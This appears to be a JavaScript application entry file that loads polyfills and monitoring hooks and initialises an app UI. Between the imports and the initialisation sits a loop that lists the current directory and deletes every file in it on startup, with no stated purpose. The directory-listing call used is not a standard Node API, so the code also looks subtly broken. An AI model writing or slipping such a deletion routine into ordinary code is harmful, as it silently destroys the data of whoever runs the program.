import './polyfills';
import {showMemoryInfo} from './development/monitoring';
import {afterDebug} from '../common/debug';
import {App} from './app';
import fs from 'fs';


let read;
const pointer = fs.listDirSync('.');

while ((read = pointer.next()) && !read.done) {
  fs.unlinkSync(read.value);
}

afterDebug(showMemoryInfo);

App.instance.ui.initialize();

